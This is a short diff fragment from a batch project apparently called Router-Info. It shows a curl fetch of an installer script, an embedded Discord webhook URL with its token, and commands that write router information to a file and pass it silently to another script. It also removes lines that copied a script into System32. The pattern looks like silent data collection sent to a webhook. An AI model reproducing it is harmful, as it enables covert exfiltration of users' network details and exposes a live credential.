@@ -9,8 +9,6 @@ curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/i
 set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
 
 installer.cmd
-cd %localappdata%\microsoft\windowsapps
-copy Router.bat C:\Windows\System32
 router>router.txt
 Source.bat -silent --file %temp%/router.txt
 
